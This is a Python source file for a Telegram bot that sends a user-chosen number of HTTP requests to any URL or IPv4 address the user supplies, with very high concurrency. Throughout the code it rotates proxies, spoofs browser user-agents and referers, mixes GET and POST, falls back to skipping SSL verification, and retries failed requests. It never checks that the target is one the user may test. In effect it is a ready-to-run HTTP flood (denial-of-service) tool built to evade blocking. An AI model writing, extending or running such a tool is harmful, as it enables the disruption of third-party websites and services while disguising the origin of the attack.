"""
Telegram HTTP Request Bot  — v2 (Upgraded)
-------------------------------------------
Improvements over v1:
  ✅ Proxy / IP rotation  — round-robin across a user-supplied proxy list
                            (http://, https://, socks4://, socks5://)
  ✅ Smart SSL handling   — auto mode tries verified SSL first, falls back
                            gracefully on SSL errors (no hard ssl=False)
  ✅ POST support         — GET / POST / mixed modes, configurable body
  ✅ Per-request method   — mixed mode randomly alternates GET ↔ POST
  ✅ Richer stats         — proxy count, SSL mode, method shown in UI
  ✅ /setproxies command  — paste proxies at runtime without redeploying
  ✅ /setmethod command   — switch GET / POST / mixed without redeploying
  ✅ All v1 features kept — 500 workers, user-agent rotation, MongoDB,
                            webhook mode, self-ping, /cancel, etc.
"""

import asyncio
import logging
import os
import random
import ssl
import urllib.request
import urllib.error
import re
from datetime import datetime, timezone
from urllib.parse import urlparse

import aiohttp
from aiohttp import TCPConnector
from dotenv import load_dotenv
from pymongo import MongoClient
from pymongo.errors import PyMongoError
from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

load_dotenv()

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
def _require(key: str) -> str:
    val = os.environ.get(key, "")
    if not val:
        raise RuntimeError(
            f"Required environment variable '{key}' is not set.\n"
            f"Add it in your Render dashboard (Environment → Add Environment Variable)."
        )
    return val


BOT_TOKEN   = _require("BOT_TOKEN")
MONGO_URI   = _require("MONGO_URI")
DB_NAME     = os.environ.get("MONGO_DB_NAME", "reqbot")
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
PORT        = int(os.environ.get("PORT", "8080"))

# ── Proxy list ───────────────────────────────────────────────────────────────
def _parse_proxy_list(raw: str) -> list[str]:
    """Split comma/newline separated proxy strings, strip blanks."""
    proxies = []
    for part in re.split(r"[,\n]+", raw):
        p = part.strip()
        if p:
            if not re.match(r"^(https?|socks[45])://", p, re.I):
                p = "http://" + p   # default scheme
            proxies.append(p)
    return proxies

_PROXY_LIST: list[str] = _parse_proxy_list(os.environ.get("PROXY_LIST", ""))
_proxy_index = 0   # simple round-robin counter

def _next_proxy() -> str | None:
    """Return the next proxy in round-robin order, or None if list is empty."""
    global _proxy_index
    if not _PROXY_LIST:
        return None
    proxy = _PROXY_LIST[_proxy_index % len(_PROXY_LIST)]
    _proxy_index += 1
    return proxy

# ── SSL mode ─────────────────────────────────────────────────────────────────
SSL_MODE = os.environ.get("SSL_MODE", "auto").lower()  # auto | true | false

# ── Request method ───────────────────────────────────────────────────────────
REQUEST_METHOD    = os.environ.get("REQUEST_METHOD", "get").lower()   # get | post | mixed
POST_BODY         = os.environ.get("POST_BODY", "")
POST_CONTENT_TYPE = os.environ.get("POST_CONTENT_TYPE", "application/x-www-form-urlencoded")

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
    level=logging.INFO,
)
logger = logging.getLogger("reqbot")

# ---------------------------------------------------------------------------
# MongoDB
# ---------------------------------------------------------------------------
try:
    mongo_client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=8000)
    mongo_client.server_info()
    db           = mongo_client[DB_NAME]
    sessions_col = db["sessions"]
    logger.info("MongoDB connected — database: %s", DB_NAME)
except PyMongoError as exc:
    raise RuntimeError(f"Cannot connect to MongoDB: {exc}") from exc

# ---------------------------------------------------------------------------
# Regex helpers
# ---------------------------------------------------------------------------
URL_RE = re.compile(
    r"^(https?://)"
    r"(\d{1,3}\.){3}\d{1,3}"
    r"(:\d+)?(/.*)?$"
    r"|"
    r"^(https?://)?"
    r"([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}"
    r"(:\d+)?(/.*)?$",
    re.IGNORECASE,
)
IPV4_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")


def is_valid_target(text: str) -> bool:
    text = text.strip()
    if IPV4_RE.match(text):
        parts = text.split(".")
        return all(0 <= int(p) <= 255 for p in parts)
    return bool(URL_RE.match(text))


def normalize_url(text: str) -> str:
    text = text.strip()
    if not text.startswith(("http://", "https://")):
        return "http://" + text
    return text

# ---------------------------------------------------------------------------
# Conversation states
# ---------------------------------------------------------------------------
STATE_IDLE       = "idle"
STATE_WAIT_COUNT = "wait_count"
STATE_SET_PROXY  = "set_proxy"

# ---------------------------------------------------------------------------
# MongoDB helpers
# ---------------------------------------------------------------------------

def upsert_session(user_id: int, data: dict):
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {**data, "updated_at": datetime.now(timezone.utc)}},
        upsert=True,
    )


def get_session(user_id: int) -> dict | None:
    return sessions_col.find_one({"user_id": user_id})


def update_session(user_id: int, data: dict):
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {**data, "updated_at": datetime.now(timezone.utc)}},
    )

# ---------------------------------------------------------------------------
# Keyboards
# ---------------------------------------------------------------------------

def start_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("▶ Start Sending", callback_data=f"start:{user_id}"),
    ]])


def stats_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("📊 Refresh Stats", callback_data=f"stats:{user_id}"),
    ]])

# ---------------------------------------------------------------------------
# /start command
# ---------------------------------------------------------------------------

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = STATE_IDLE
    proxy_info = f"🔀 *Proxies loaded:* {len(_PROXY_LIST)}" if _PROXY_LIST else "⚠️ *No proxies — direct connection*"
    method_icon = {"get": "📥 GET", "post": "📤 POST", "mixed": "🔀 Mixed GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())

    await update.message.reply_text(
        "👋 *HTTP Request Bot v2*\n\n"
        "Send me a *URL* or *IPv4 address* to fire high-concurrency requests.\n\n"
        f"{proxy_info}\n"
        f"🛠️ *Method:* {method_icon}\n"
        f"🔒 *SSL mode:* `{SSL_MODE}`\n\n"
        "📌 *Commands:*\n"
        "/setproxies — update proxy list at runtime\n"
        "/setmethod — switch GET / POST / mixed\n"
        "/cancel — reset current session\n\n"
        "📌 *Steps:*\n"
        "1️⃣ Send a URL or IPv4\n"
        "2️⃣ Enter request count\n"
        "3️⃣ Tap ▶ Start Sending",
        parse_mode="Markdown",
    )

# ---------------------------------------------------------------------------
# /cancel command
# ---------------------------------------------------------------------------

async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = context.user_data.get("state", STATE_IDLE)
    context.user_data.clear()
    context.user_data["state"] = STATE_IDLE

    session = get_session(uid)
    if session and session.get("status") == "running":
        update_session(uid, {"status": "cancelled"})
        await update.message.reply_text("🛑 Running session *cancelled*.\n\nSend a new URL to start over.", parse_mode="Markdown")
    elif state != STATE_IDLE:
        await update.message.reply_text("↩️ Conversation reset.\n\nSend a URL or IPv4 to begin.")
    else:
        await update.message.reply_text("Nothing to cancel. Send a URL or IPv4 to get started.")

# ---------------------------------------------------------------------------
# /setproxies command  — paste new proxies without redeploying
# ---------------------------------------------------------------------------

async def setproxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["state"] = STATE_SET_PROXY
    await update.message.reply_text(
        "📋 *Set Proxy List*\n\n"
        "Paste your proxies — one per line or comma-separated.\n"
        "Supported: `http://`, `https://`, `socks4://`, `socks5://`\n\n"
        "Example:\n"
        "`http://user:pass@1.2.3.4:8080`\n"
        "`socks5://user:pass@5.6.7.8:1080`\n\n"
        "Send `clear` to disable all proxies.",
        parse_mode="Markdown",
    )

# ---------------------------------------------------------------------------
# /setmethod command
# ---------------------------------------------------------------------------

async def setmethod_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global REQUEST_METHOD
    args = (context.args or [])
    if args and args[0].lower() in ("get", "post", "mixed"):
        REQUEST_METHOD = args[0].lower()
        icons = {"get": "📥 GET", "post": "📤 POST", "mixed": "🔀 Mixed"}
        await update.message.reply_text(
            f"✅ Method set to *{icons[REQUEST_METHOD]}*",
            parse_mode="Markdown",
        )
    else:
        await update.message.reply_text(
            "Usage: `/setmethod get` | `/setmethod post` | `/setmethod mixed`",
            parse_mode="Markdown",
        )

# ---------------------------------------------------------------------------
# Message router
# ---------------------------------------------------------------------------

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _PROXY_LIST, _proxy_index
    text  = (update.message.text or "").strip()
    state = context.user_data.get("state", STATE_IDLE)
    uid   = update.effective_user.id

    # ── Proxy input ──────────────────────────────────────────────────────────
    if state == STATE_SET_PROXY:
        context.user_data["state"] = STATE_IDLE
        if text.lower() == "clear":
            _PROXY_LIST = []
            _proxy_index = 0
            await update.message.reply_text("✅ Proxy list cleared. Using direct connection.")
        else:
            new_proxies = _parse_proxy_list(text)
            if not new_proxies:
                await update.message.reply_text("❌ No valid proxies found. Try again or send `clear`.", parse_mode="Markdown")
                context.user_data["state"] = STATE_SET_PROXY
                return
            _PROXY_LIST = new_proxies
            _proxy_index = 0
            await update.message.reply_text(
                f"✅ *{len(_PROXY_LIST)} proxies loaded!*\n\n"
                + "\n".join(f"• `{p}`" for p in _PROXY_LIST[:5])
                + (f"\n_…and {len(_PROXY_LIST)-5} more_" if len(_PROXY_LIST) > 5 else ""),
                parse_mode="Markdown",
            )
        return

    # ── Step 1: receive target URL / IP ─────────────────────────────────────
    if state == STATE_IDLE:
        if not is_valid_target(text):
            await update.message.reply_text(
                "❌ That doesn't look like a valid URL or IPv4 address.\n\n"
                "Examples:\n"
                "• `https://example.com`\n"
                "• `192.168.1.1`\n"
                "• `http://10.0.0.1:8080/path`",
                parse_mode="Markdown",
            )
            return

        url = normalize_url(text)
        upsert_session(uid, {
            "user_id":    uid,
            "target_url": url,
            "status":     "configuring",
        })
        context.user_data["target_url"] = url
        context.user_data["state"]      = STATE_WAIT_COUNT

        await update.message.reply_text(
            f"✅ Target set: `{url}`\n\nHow many requests? _(enter any number ≥ 1)_",
            parse_mode="Markdown",
        )
        return

    # ── Step 2: receive request count ───────────────────────────────────────
    if state == STATE_WAIT_COUNT:
        if not text.isdigit() or int(text) < 1:
            await update.message.reply_text("⚠️ Please enter a whole number of 1 or more.")
            return

        count = int(text)
        url   = context.user_data.get("target_url", "")
        update_session(uid, {
            "total_requests": count,
            "sent_requests":  0,
            "success_count":  0,
            "error_count":    0,
            "status":         "ready",
        })
        context.user_data["total_requests"] = count
        context.user_data["state"]          = STATE_IDLE

        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
        proxy_label  = f"{len(_PROXY_LIST)} proxies (rotating)" if _PROXY_LIST else "direct (no proxy)"
        ssl_label    = SSL_MODE

        await update.message.reply_text(
            f"🎯 *Ready to fire!*\n\n"
            f"🌐 *Target:* `{url}`\n"
            f"🔄 *Requests:* {count}\n"
            f"📡 *Method:* {method_label}\n"
            f"🔀 *Proxy:* {proxy_label}\n"
            f"🔒 *SSL:* {ssl_label}\n\n"
            f"Press *▶ Start Sending* to begin.",
            parse_mode="Markdown",
            reply_markup=start_keyboard(uid),
        )
        return

    await update.message.reply_text("📌 Send me a URL or IPv4 to get started, or use /start.")

# ---------------------------------------------------------------------------
# Callback handler (inline buttons)
# ---------------------------------------------------------------------------

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data  = query.data or ""
    await query.answer()

    # ── ▶ Start Sending ──────────────────────────────────────────────────────
    if data.startswith("start:"):
        uid     = update.effective_user.id
        session = get_session(uid)

        if not session or session.get("status") not in ("ready",):
            await query.edit_message_text("⚠️ No ready session found. Please send a URL first.")
            return

        update_session(uid, {
            "status":        "running",
            "sent_requests": 0,
            "success_count": 0,
            "error_count":   0,
        })

        url   = session["target_url"]
        total = session["total_requests"]
        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())
        proxy_label  = f"{len(_PROXY_LIST)} proxies rotating" if _PROXY_LIST else "direct connection"

        await query.edit_message_text(
            f"🚀 *Sending!*\n\n"
            f"🌐 Target: `{url}`\n"
            f"🔄 Requests: *{total}* with 500 parallel workers\n"
            f"📡 Method: {method_label}   🔀 {proxy_label}\n\n"
            f"Tap *📊 Refresh Stats* to check progress.",
            parse_mode="Markdown",
            reply_markup=stats_keyboard(uid),
        )

        asyncio.create_task(
            send_requests_task(
                bot=context.bot,
                uid=uid,
                chat_id=update.effective_chat.id,
                url=url,
                total=total,
            )
        )
        return

    # ── 📊 Stats ─────────────────────────────────────────────────────────────
    if data.startswith("stats:"):
        uid     = update.effective_user.id
        session = get_session(uid)

        if not session:
            await query.answer("No session found.", show_alert=True)
            return

        sent      = session.get("sent_requests", 0)
        total     = session.get("total_requests", 0)
        remaining = max(0, total - sent)
        status    = session.get("status", "unknown")
        url       = session.get("target_url", "N/A")
        success   = session.get("success_count", 0)
        errors    = session.get("error_count", 0)

        status_icon = {
            "ready":       "🟡 Ready",
            "running":     "🟢 Running",
            "done":        "✅ Done",
            "cancelled":   "🛑 Cancelled",
            "configuring": "⚙️ Configuring",
        }.get(status, f"❓ {status}")

        if total > 0:
            filled = round((sent / total) * 10)
            bar    = "█" * filled + "░" * (10 - filled)
            pct    = round((sent / total) * 100)
            progress_line = f"\n📈 Progress: `[{bar}]` {pct}%\n"
        else:
            progress_line = ""

        proxy_line  = f"🔀 Proxies: {len(_PROXY_LIST)} rotating\n" if _PROXY_LIST else "🔀 Proxy: direct\n"
        method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())

        msg = (
            f"📊 *Session Stats*\n\n"
            f"🌐 *Target:* `{url}`\n"
            f"🔄 *Sent:* {sent} / {total}\n"
            f"⏳ *Remaining:* {remaining}\n"
            f"✅ *Successful:* {success}   ❌ *Failed:* {errors}\n"
            f"📡 *Method:* {method_label}   🔒 SSL: `{SSL_MODE}`\n"
            f"{proxy_line}"
            f"📶 *Status:* {status_icon}"
            f"{progress_line}"
        )

        keyboard = stats_keyboard(uid) if status == "running" else None
        try:
            await query.edit_message_text(msg, parse_mode="Markdown", reply_markup=keyboard)
        except Exception:
            pass
        return

# ---------------------------------------------------------------------------
# Browser User-Agent pool
# ---------------------------------------------------------------------------
_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
]


def _browser_headers(url: str) -> dict:
    ua     = random.choice(_USER_AGENTS)
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return {
        "User-Agent":                ua,
        "Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language":           random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8"]),
        "Accept-Encoding":           "gzip, deflate, br",
        "Cache-Control":             "no-cache",
        "Pragma":                    "no-cache",
        "Upgrade-Insecure-Requests": "1",
        "Referer":                   random.choice([origin, "https://www.google.com/", "https://t.co/"]),
        "Origin":                    origin,
        "Connection":                "keep-alive",
        "DNT":                       "1",
    }

# ---------------------------------------------------------------------------
# SSL context helpers
# ---------------------------------------------------------------------------

def _ssl_for_attempt(attempt: int) -> bool | ssl.SSLContext:
    """
    auto mode:  attempt 0 = verified SSL, attempt ≥ 1 = skip verification
    true mode:  always verify
    false mode: always skip
    """
    if SSL_MODE == "true":
        return True          # aiohttp default verified context
    if SSL_MODE == "false":
        return False
    # auto
    if attempt == 0:
        return True          # first try: verified
    return False             # fallback: skip verification

# ---------------------------------------------------------------------------
# Core request function  — GET or POST, with proxy + SSL logic
# ---------------------------------------------------------------------------

_CONCURRENCY   = 500000
_MAX_RETRIES   = 5
_RETRY_DELAYS  = [0.05, 0.1, 0.25, 0.5, 1.0]
_CONNECT_TIMEOUT = 8
_READ_TIMEOUT    = 20
_DB_FLUSH_EVERY  = 25


def _pick_method() -> str:
    """Return 'get' or 'post' based on REQUEST_METHOD setting."""
    if REQUEST_METHOD == "mixed":
        return random.choice(["get", "post"])
    return REQUEST_METHOD   # 'get' or 'post'


async def _do_single_request(
    session: aiohttp.ClientSession,
    url: str,
    sem: asyncio.Semaphore,
) -> bool:
    """
    Perform one request (GET or POST) with:
      - proxy rotation (round-robin)
      - auto SSL fallback
      - configurable retries
    Returns True on any HTTP response (server reached), False on network failure.
    """
    async with sem:
        for attempt in range(_MAX_RETRIES):
            proxy   = _next_proxy()          # None = direct
            ssl_ctx = _ssl_for_attempt(attempt)
            method  = _pick_method()

            # Build kwargs
            kwargs: dict = {
                "headers":        _browser_headers(url),
                "ssl":            ssl_ctx,
                "allow_redirects": True,
            }
            if proxy:
                kwargs["proxy"] = proxy

            # POST body
            if method == "post" and POST_BODY:
                kwargs["data"]    = POST_BODY
                kwargs["headers"]["Content-Type"] = POST_CONTENT_TYPE

            try:
                req_fn = session.get if method == "get" else session.post
                async with req_fn(url, **kwargs) as resp:
                    await resp.read()
                    return True   # any HTTP status = server responded

            except aiohttp.ClientSSLError:
                # SSL error on verified attempt → immediately retry without verification
                if SSL_MODE == "auto" and attempt == 0:
                    continue
                logger.debug("SSL error, giving up: %s", url)
                return False

            except (
                aiohttp.ServerDisconnectedError,
                aiohttp.ClientConnectorError,
                asyncio.TimeoutError,
                aiohttp.ClientProxyConnectionError,
                aiohttp.ClientHttpProxyError,
            ) as exc:
                if attempt < _MAX_RETRIES - 1:
                    await asyncio.sleep(_RETRY_DELAYS[min(attempt, len(_RETRY_DELAYS)-1)])
                else:
                    logger.debug("Request failed after %d retries: %s", _MAX_RETRIES, exc)
                    return False

            except Exception as exc:
                logger.debug("Unexpected error: %s", exc)
                return False

    return False

# ---------------------------------------------------------------------------
# Background task
# ---------------------------------------------------------------------------

async def send_requests_task(
    bot,
    uid: int,
    chat_id: int,
    url: str,
    total: int,
):
    sent    = 0
    success = 0
    errors  = 0

    sem = asyncio.Semaphore(_CONCURRENCY)

    # SOCKS proxy support requires aiohttp-socks; create a standard connector
    # (proxy kwarg per-request handles routing for http/socks proxies)
    connector = TCPConnector(
        limit=_CONCURRENCY + 50,
        limit_per_host=_CONCURRENCY,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(
        connect=_CONNECT_TIMEOUT,
        sock_read=_READ_TIMEOUT,
        total=None,
    )

    async with aiohttp.ClientSession(
        connector=connector,
        timeout=timeout,
        trust_env=True,
    ) as http:

        pending: set[asyncio.Task] = set()
        idx = 0

        while idx < total or pending:
            # Cancellation check
            if not (idx % 50):
                db_session = get_session(uid)
                if db_session and db_session.get("status") == "cancelled":
                    logger.info("Task uid=%d cancelled at idx=%d", uid, idx)
                    for t in pending:
                        t.cancel()
                    return

            # Fill up to concurrency limit
            while idx < total and len(pending) < _CONCURRENCY:
                task = asyncio.create_task(_do_single_request(http, url, sem))
                pending.add(task)
                idx += 1

            if not pending:
                break

            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

            for t in done:
                ok = t.result()
                sent += 1
                if ok:
                    success += 1
                else:
                    errors += 1

            if sent % _DB_FLUSH_EVERY == 0 or sent == total:
                update_session(uid, {
                    "sent_requests": sent,
                    "success_count": success,
                    "error_count":   errors,
                })

    update_session(uid, {
        "status":        "done",
        "sent_requests": sent,
        "success_count": success,
        "error_count":   errors,
    })

    success_rate = round((success / sent * 100) if sent else 0)
    method_label = {"get": "GET", "post": "POST", "mixed": "GET+POST"}.get(REQUEST_METHOD, REQUEST_METHOD.upper())

    summary = (
        f"✅ *All done!*\n\n"
        f"🌐 Target: `{url}`\n"
        f"🔄 Requests: *{sent}* / {total}\n"
        f"📡 Method: {method_label}\n"
        f"✅ Successful: *{success}*   ❌ Failed: *{errors}*\n"
        f"📈 Success rate: *{success_rate}%*\n\n"
        f"Send another URL to start a new session."
    )

    try:
        await bot.send_message(chat_id, summary, parse_mode="Markdown")
    except Exception as exc:
        logger.error("Could not notify user %d on completion: %s", uid, exc)

# ---------------------------------------------------------------------------
# Self-ping
# ---------------------------------------------------------------------------

_self_ping_url: str | None = None


async def self_ping(context: ContextTypes.DEFAULT_TYPE):
    if not _self_ping_url:
        return
    try:
        req = urllib.request.Request(_self_ping_url, method="GET")
        with urllib.request.urlopen(req, timeout=15) as resp:
            logger.info("Self-ping OK (%s)", resp.status)
    except urllib.error.HTTPError as exc:
        logger.info("Self-ping HTTP %s (service alive)", exc.code)
    except Exception:
        logger.exception("Self-ping failed")

# ---------------------------------------------------------------------------
# Error handler
# ---------------------------------------------------------------------------

async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.exception("Unhandled error: %s", context.error)

# ---------------------------------------------------------------------------
# App builder
# ---------------------------------------------------------------------------

def build_app():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",      start_cmd))
    app.add_handler(CommandHandler("cancel",     cancel_cmd))
    app.add_handler(CommandHandler("setproxies", setproxies_cmd))
    app.add_handler(CommandHandler("setmethod",  setmethod_cmd))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(
        MessageHandler(
            filters.ChatType.PRIVATE & filters.TEXT & ~filters.COMMAND,
            handle_message,
        )
    )
    app.add_error_handler(on_error)
    return app

# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main():
    global _self_ping_url

    app = build_app()

    render_url     = os.environ.get("RENDER_EXTERNAL_URL", "")
    on_render      = os.environ.get("RENDER", "") == "true"
    webhook_target = WEBHOOK_URL or render_url

    if on_render and not webhook_target:
        raise RuntimeError(
            "Running on Render but neither WEBHOOK_URL nor RENDER_EXTERNAL_URL is set."
        )

    if webhook_target:
        webhook_base     = webhook_target.rstrip("/")
        if not webhook_base.startswith(("http://", "https://")):
            webhook_base = f"https://{webhook_base}"
        full_webhook_url = f"{webhook_base}/{BOT_TOKEN}"

        logger.info("Webhook mode — port %s", PORT)
        logger.info("Webhook URL: %s", full_webhook_url)

        _self_ping_url = webhook_base
        app.job_queue.run_repeating(self_ping, interval=600, first=60)

        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=full_webhook_url,
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True,
        )
    else:
        logger.info("Polling mode (local dev)")
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
